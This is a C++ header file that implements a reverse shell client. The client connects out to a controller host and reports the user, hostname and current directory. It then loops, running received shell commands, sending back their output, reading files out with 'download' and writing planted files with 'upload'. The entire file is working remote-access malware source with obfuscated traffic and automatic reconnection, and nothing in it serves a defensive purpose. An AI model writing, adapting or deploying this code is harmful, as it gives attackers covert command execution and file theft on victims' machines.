#ifndef SECONDSH
#define SECONDSH
// reverse shell header file using IPV4 
// connects to shmain socket

#include "utils.hpp"

const unsigned int BUFFER_SIZE = 9999;

struct secondsh{
    int bytes_red = (int) NULL;
    int bytes_written = (int) NULL;
    int global_socket = (int) NULL;

    unsigned int PORT_ = (int) NULL;
    std::string hostname_;

    std::string system_output(std::string cmd) {
        std::string data;
        FILE * stream;

        char buffer[BUFFER_SIZE];
        cmd.append(" 2>&1");

        stream = popen(cmd.c_str(), "r");
        if (stream){
        while (!feof(stream)){
            if(fgets(buffer, BUFFER_SIZE, stream) != NULL){ data.append(buffer);}
        }
        pclose(stream);
                
        }
        return data;
 
    }

    int* connect_socket(unsigned int PORT, const std::string hostname){
        signal(SIGPIPE, SIG_IGN); // used to handle SIGPIPE, if not ignored it crashes
        PORT_ = PORT;
        hostname_ = hostname;

        char buffer[BUFFER_SIZE];

        struct hostent* host = gethostbyname(hostname.c_str()); 
        sockaddr_in send_sock_addr;   
        bzero((char*)&send_sock_addr, sizeof(send_sock_addr)); 
        send_sock_addr.sin_family = AF_INET; //IPV4
        send_sock_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr*)*host->h_addr_list)); // inet_ntoa converts host address in network bytes
        send_sock_addr.sin_port = htons(PORT); // makes sure that numbers are stored in memory in network byte order

        int client_sd = socket(AF_INET, SOCK_STREAM, 0);
        int* ptr_clientsd = &client_sd;
        global_socket = client_sd;
        //try to connect...
        int bind_status = connect(client_sd, (sockaddr*) &send_sock_addr, sizeof(send_sock_addr));
        if(bind_status < 0){
            std::chrono::seconds duration(5);
            std::this_thread::sleep_for(duration);
            connect_socket(PORT, hostname);
        }

        struct timeval start1, end1;
        gettimeofday(&start1, NULL);

        std::string whoami = ncrypt(system_output("whoami"));

        memset(&buffer, 0x00, sizeof(buffer)); //clear the buffer
        strcpy(buffer, whoami.c_str());
        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0);

        std::string chostname = ncrypt(system_output("hostname"));
        memset(&buffer, 0x00, sizeof(buffer)); //clear the buffer
        strcpy(buffer, chostname.c_str());
        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0);

        std::string current_dir = ncrypt(system_output("echo $PWD"));
        memset(&buffer, 0x00, sizeof(buffer));
        strcpy(buffer, current_dir.c_str());
        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0); // sending current_dir

        return ptr_clientsd;

    }

    void connectsh(){
        char buffer[BUFFER_SIZE];
        
        while(true){
            memset(&buffer, 0x00, sizeof(buffer));
            int read = recv(global_socket, (char*)&buffer, sizeof(buffer), 0); // read command
            bytes_red += read;

            // decrypt buffer
            std::string newbuff = dcrypt(std::string(buffer));
            memset(&buffer, 0x00, sizeof(buffer));
            strcpy(buffer, newbuff.c_str());

            std::string s_buffer = std::string(buffer);
            std::string token = s_buffer.substr(0, s_buffer.find(" "));
        
            // disconnect from socket (but secondsh is still on)
            if(!strcmp(buffer, "disconnect")){
                close(global_socket); // close socket
                
                std::chrono::seconds duration(2);
                std::this_thread::sleep_for(duration);

                // reset variables
                unsigned int temp_port = PORT_;
                std::string temp_hostname = hostname_;
                
                bytes_red = (int) NULL;
                bytes_written = (int) NULL;
                global_socket = (int) NULL;
                PORT_ = (int) NULL;
                hostname_ = "";

                // restart socket
                connect_socket(temp_port, temp_hostname);
                connectsh();
            }
            // (stop process) secondsh exits
            else if(!strcmp(buffer, "stoprocess")){
                close(global_socket);
                exit(1);
            }

            else if(token == "download"){
                std::string file = s_buffer.substr(9, s_buffer.length());
                std::string c = "cat " + file;
                std::string out = system_output(c);
                strcpy(buffer, ncrypt(out).c_str());
                bytes_written += send(global_socket, (char*)&buffer, strlen(buffer)+1, 0);
            }

            else if(token == "upload"){
                std::vector<std::string> vec = split(std::string(buffer), ' ');
                std::string upload_dir = vec[2];
                std::string file_name = vec[3];
                
                memset(buffer, 0x00, sizeof(buffer));
                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);

                std::string file_content = dcrypt(std::string(buffer));
                std::string mk_file = "touch " + upload_dir + "/" + file_name;
                system(mk_file.c_str());
               

                std::ofstream file;
                file.open(upload_dir+"/"+file_name);
                file << dcrypt(std::string(buffer)) << std::endl;
                file.flush();
                file.close();

                

            }

            system(buffer);
            std::string cmd_out = system_output(std::string(buffer));
            std::string crypt_out = ncrypt(cmd_out);
            //std::cout << buffer << std::endl;
            strcpy(buffer, crypt_out.c_str());
            // send size of cmd_out first
            bytes_written += send(global_socket, (char*)&buffer, strlen(buffer)+1, 0);
     
        }


    }

};

#endif
